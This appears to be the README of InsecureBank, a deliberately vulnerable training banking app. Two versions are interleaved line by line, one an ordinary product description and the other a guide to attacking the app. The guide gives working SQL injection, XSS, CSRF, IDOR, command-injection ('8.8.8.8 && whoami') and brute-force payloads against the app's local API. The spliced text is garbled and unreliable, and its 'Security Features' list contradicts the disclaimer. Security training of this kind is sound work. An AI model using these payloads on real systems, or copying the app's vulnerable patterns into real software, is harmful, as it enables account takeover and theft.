# InsecureBank - Modern Banking Application# InsecureBank - Modern Banking Application



A full-stack web application demonstrating a modern banking interface with comprehensive user management, transaction processing, and administrative features.A full-stack web application demonstrating a modern banking interface with comprehensive user management, transaction processing, and administrative features.



## 📋 Table of Contents## ⚠️ Disclaimer



- [Overview](#overview)**This application contains intentional security vulnerabilities. Use only for educational purposes in controlled environments.**

- [Features](#features)

- [Tech Stack](#tech-stack)

- [Project Structure](#project-structure)## 👥 User Credentials

- [Prerequisites](#prerequisites)

- [Installation](#installation)| Username | Password | Role |

- [Configuration](#configuration)|----------|----------|------|

- [Usage](#usage)| `admin` | `admin123` | Administrator |

- [API Endpoints](#api-endpoints)| `john_doe` | `password` | User |

- [Database Schema](#database-schema)| `jane_smith` | `123456` | User |

- [Security Features](#security-features)| `bob_wilson` | `Bobbbb` | User |

- [Contributing](#contributing)| `ycp27` | `ycp123` | User |

- [License](#license)

---

## 🎯 Overview

## 🎯 Attack Demonstrations

InsecureBank is a comprehensive banking application built with modern web technologies. It provides a realistic banking experience with features including user authentication, account management, money transfers, transaction history, and administrative controls. The application is designed with a clean, responsive interface and robust backend architecture.

### 1. SQL Injection Attack

## ✨ Features

**Authentication Bypass**

### User Features

- **Authentication System**SQL Injection allows attackers to manipulate database queries by injecting malicious SQL code through input fields.

  - User registration and login

  - Session management**Test Case:**

  - Password reset functionality- Navigate to login page

  - Username: `admin'--  OR '1'='1`

- **Account Management**- Password: `anything`

  - View account balance and details- Result: Bypasses authentication without valid credentials

  - Update profile information

  - Transaction history tracking**Why it works:** The injected SQL creates a condition that's always true, breaking the intended query logic.

  

- **Financial Operations**---

  - Transfer money between accounts

  - Real-time balance updates### 2. Cross-Site Scripting (XSS) Attack

  - Transaction descriptions and tracking

  **Stored XSS in Profile**

- **User Interface**

  - Responsive design for all devicesXSS allows attackers to inject malicious scripts that execute in other users' browsers, potentially stealing session data.

  - Clean, modern banking interface

  - Real-time notifications and confirmations**Test Case:**

- Login as any user

### Administrative Features- Navigate to Profile Management

- **User Management**- Full Name field: `<img src=x onerror=alert('XSS')>`

  - View all registered users- Update profile

  - Edit user information- When admin views this profile, the script executes

  - Delete user accounts

  - Account statistics dashboard**Payloads to try:**

  ```html

- **System Tools**<img src=x onerror=alert(document.cookie)>

  - Network connectivity testing<script>alert('XSS')</script>

  - System monitoring capabilities<svg/onload=alert('XSS')>

  ```

- **Analytics Dashboard**

  - Total users count---

  - Total system balance

  - Average account balance### 3. Insecure Direct Object Reference (IDOR)



## 🛠️ Tech Stack**Unauthorized Data Access**



### FrontendIDOR vulnerabilities allow attackers to access resources belonging to other users by manipulating object references.

- **React 19** - Modern UI library

- **Vite** - Fast build tool and development server**Test Case - View Other Users' Transactions:**

- **Lucide React** - Professional icon library- Login as `john_doe` (ID: 2)

- **CSS3 & Tailwind CSS** - Styling and responsive design- Open browser console (F12)

- **JavaScript ES6+** - Modern JavaScript features- Execute:

```javascript

### Backendfetch('http://localhost:5000/api/transactions/1', {

- **Node.js** - Runtime environment  credentials: 'include'

- **Express.js** - Web application framework}).then(r => r.json()).then(console.log)

- **MySQL2** - Database driver```

- **CORS** - Cross-origin resource sharing- Result: Access admin's transactions without authorization

- **Body-parser** - Request body parsing

- **Cookie-parser** - Cookie handling middleware**Test Case - Modify Other Users' Profiles:**

```javascript

### Databasefetch('http://localhost:5000/api/profile/1', {

- **MySQL** - Relational database management system  method: 'PUT',

- **phpMyAdmin** - Database administration interface  headers: { 'Content-Type': 'application/json' },

  credentials: 'include',

### Development Tools  body: JSON.stringify({

- **Git** - Version control    fullName: 'Modified Name',

- **npm** - Package management    email: 'modified@email.com'

- **XAMPP** - Local development environment  })

}).then(r => r.json()).then(console.log)

## 📁 Project Structure```



```---

InsecureBank/

├── README.md                    # Project documentation### 4. Cross-Site Request Forgery (CSRF)

├── demo-files/                  # Database setup files

│   └── manual-db-setup.sql     # Database initialization script**Unauthorized Actions**

├── backend/                     # Backend application

│   ├── server.js               # Main server fileCSRF tricks authenticated users into performing unintended actions by exploiting their active session.

│   ├── package.json            # Backend dependencies

│   └── node_modules/           # Backend packages**Test Case - Malicious Money Transfer:**

└── vul-bank-app/               # Frontend application

    ├── public/                 # Static assetsCreate `csrf-attack.html`:

    ├── src/                    # Source code```html

    │   ├── components/         # React components<!DOCTYPE html>

    │   │   ├── AdminPanel.jsx         # Admin management interface<html>

    │   │   ├── Dashboard.jsx          # Main user dashboard<body>

    │   │   ├── TransferMoney.jsx      # Money transfer component    <h1>You Won a Prize!</h1>

    │   │   ├── TransactionHistory.jsx # Transaction tracking    <form id="csrf" action="http://localhost:5000/api/transfer" method="POST" style="display:none;">

    │   │   ├── UserSearch.jsx         # User search functionality        <input name="recipient" value="ycp27">

    │   │   ├── ProfileManager.jsx     # Profile management        <input name="amount" value="1000">

    │   │   ├── SystemTools.jsx        # Network tools    </form>

    │   │   ├── LandingPage.jsx        # Homepage    <script>

    │   │   ├── LoginPage.jsx          # Authentication        setTimeout(() => document.getElementById('csrf').submit(), 1000);

    │   │   ├── RegisterPage.jsx       # User registration    </script>

    │   │   ├── ForgotPassword.jsx     # Password recovery</body>

    │   │   └── ConfirmModal.jsx       # Confirmation dialogs</html>

    │   ├── App.jsx             # Main application component```

    │   ├── main.jsx            # Application entry point- Victim opens this page while logged into the bank

    │   └── index.css           # Global styles- Result: Money transferred without victim's knowledge

    ├── package.json            # Frontend dependencies

    ├── vite.config.js          # Vite configuration---

    └── node_modules/           # Frontend packages

```### 5. Command Injection Attack



## 🔧 Prerequisites**Remote Code Execution**



- **Node.js** (v16.0.0 or higher)Command injection allows attackers to execute arbitrary system commands on the server.

- **npm** (v7.0.0 or higher)

- **XAMPP** (for MySQL database)**Test Case - System Tools Exploitation:**

- **Modern web browser** (Chrome, Firefox, Safari, Edge)- Navigate to System Tools

- Host/IP field: `8.8.8.8 && whoami`

## 🚀 Installation- Result: Executes system command and reveals server user



### 1. Clone Repository**Additional payloads:**

```bash```bash

git clone https://github.com/Yrcd27/Insecure-Bank.git8.8.8.8 && dir          # List directory contents

cd Insecure-Bank8.8.8.8 && ipconfig     # Network configuration

```8.8.8.8 && systeminfo   # System information

```

### 2. Setup Database

1. Start XAMPP and enable Apache + MySQL services---

2. Access phpMyAdmin at `http://localhost/phpmyadmin`

3. Create database named `insecure_bank`### 6. Broken Access Control

4. Import the SQL file from `demo-files/manual-db-setup.sql`

**Privilege Escalation**

### 3. Install Backend Dependencies

```bashMissing authorization checks allow regular users to access admin-only functionality.

cd backend

npm install**Test Case - Access Admin Data:**

```- Login as regular user

- Open browser console

### 4. Install Frontend Dependencies- Execute:

```bash```javascript

cd ../vul-bank-appfetch('http://localhost:5000/api/admin/users', {

npm install  credentials: 'include'

```}).then(r => r.json()).then(console.log)

```

## ⚙️ Configuration- Result: Regular user retrieves admin-only data



### Database Configuration**Test Case - Delete Users:**

Update database connection settings in `backend/server.js`:```javascript

fetch('http://localhost:5000/api/admin/user/3', {

```javascript  method: 'DELETE',

const db = mysql.createConnection({  credentials: 'include'

  host: 'localhost',}).then(r => r.json()).then(console.log)

  user: 'root',```

  password: '',

  database: 'insecure_bank'---

});

```### 7. Session Hijacking



### Environment Variables**Cookie Theft via XSS**

Create `.env` file in backend directory:

```envCombining XSS with cookie theft allows attackers to impersonate victims.

PORT=5000

DB_HOST=localhost**Test Case:**

DB_USER=root- Inject in profile: `<img src=x onerror="alert(document.cookie)">`

DB_PASSWORD=- When admin views profile, session cookie is exposed

DB_NAME=insecure_bank- Attacker can use this cookie to impersonate the admin

```

**Manual Cookie Manipulation:**

## 🎮 Usage- F12 → Application → Cookies

- Change `userId` value to `1` (admin)

### Start Backend Server- Refresh page

```bash- Result: Potential admin access

cd backend

npm start---

# Server runs on http://localhost:5000

```### 8. Brute Force Attack



### Start Frontend Development Server**Password Guessing**

```bash

cd vul-bank-appAbsence of rate limiting allows unlimited login attempts.

npm run dev

# Application available at http://localhost:5173**Test Case:**

``````javascript

const passwords = ['admin', 'admin123', 'password', '123456'];

### Access Application

1. Open browser and navigate to `http://localhost:5173`async function bruteForce() {

2. Use provided user credentials to login  for (let pwd of passwords) {

3. Explore banking features and admin panel    const response = await fetch('http://localhost:5000/api/login', {

      method: 'POST',

## 🔌 API Endpoints      headers: { 'Content-Type': 'application/json' },

      body: JSON.stringify({ username: 'admin', password: pwd })

### Authentication    });

- `POST /api/login` - User authentication    const data = await response.json();

- `POST /api/register` - User registration    if (data.message === 'Login successful') {

- `POST /api/logout` - User logout      console.log('Found password:', pwd);

      break;

### User Management    }

- `GET /api/profile/:id` - Get user profile  }

- `PUT /api/profile/:id` - Update user profile}

- `GET /api/transactions/:userId` - Get user transactionsbruteForce();

```

### Financial Operations

- `POST /api/transfer` - Transfer money between accounts---

- `GET /api/balance/:userId` - Get account balance

### 9. Information Disclosure

### Administrative

- `GET /api/admin/users` - Get all users (admin only)**Sensitive Data Exposure**

- `DELETE /api/admin/user/:id` - Delete user (admin only)

- `PUT /api/admin/user/:id` - Update user (admin only)API responses contain sensitive information that should never be exposed to clients.



### System Tools**Test Case:**

- `POST /api/ping` - Network connectivity test- Login and open Network tab (F12)

- Observe API responses

## 🗄️ Database Schema- Result: Plain text passwords and sensitive user data visible



### Users Table```javascript

```sqlfetch('http://localhost:5000/api/login', {

CREATE TABLE users (  method: 'POST',

  id INT AUTO_INCREMENT PRIMARY KEY,  headers: { 'Content-Type': 'application/json' },

  username VARCHAR(50) UNIQUE NOT NULL,  body: JSON.stringify({ username: 'admin', password: 'admin123' })

  password VARCHAR(255) NOT NULL,}).then(r => r.json()).then(console.log)

  full_name VARCHAR(100) NOT NULL,```

  email VARCHAR(100) NOT NULL,Response includes password in plain text!

  balance DECIMAL(10, 2) DEFAULT 0.00,

  role VARCHAR(20) DEFAULT 'user',---

  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP

);## � Learning Resources

```

## 📚 Learning Resources

### Transactions Table

```sql- **OWASP Top 10** - [https://owasp.org/Top10/](https://owasp.org/Top10/)

CREATE TABLE transactions (- **PortSwigger Web Security Academy** - [https://portswigger.net/web-security](https://portswigger.net/web-security)

  id INT AUTO_INCREMENT PRIMARY KEY,

  user_id INT NOT NULL,---

  type VARCHAR(20) NOT NULL,

  amount DECIMAL(10, 2) NOT NULL,**⚠️ Use only for educational purposes in controlled environments. Never test on systems without authorization.**

  recipient_id INT,

  description VARCHAR(255),**Repository**: [https://github.com/Yrcd27/Insecure-Bank](https://github.com/Yrcd27/Insecure-Bank)

  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_id) REFERENCES users(id),
  FOREIGN KEY (recipient_id) REFERENCES users(id)
);
```

## 🔐 Security Features

- **Session Management** - Cookie-based user sessions
- **Input Validation** - Client-side form validation
- **CORS Protection** - Cross-origin request handling
- **SQL Database** - Structured data storage
- **Authentication** - User login/logout system
- **Authorization** - Role-based access control
- **Secure Transfers** - Transaction verification

## 👥 User Accounts

The application comes with pre-configured user accounts:

| Username | Password | Role | Access Level |
|----------|----------|------|--------------|
| admin | admin123 | Administrator | Full system access |
| john_doe | password | User | Standard banking features |
| jane_smith | 123456 | User | Standard banking features |
| bob_wilson | Bobbbb | User | Standard banking features |
| ycp27 | ycp123 | User | Standard banking features |

## 🤝 Contributing

1. Fork the repository
2. Create feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open Pull Request

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🔗 Links

- **Repository**: [https://github.com/Yrcd27/Insecure-Bank](https://github.com/Yrcd27/Insecure-Bank)
- **Issues**: [https://github.com/Yrcd27/Insecure-Bank/issues](https://github.com/Yrcd27/Insecure-Bank/issues)

---

**Built with ❤️ using modern web technologies**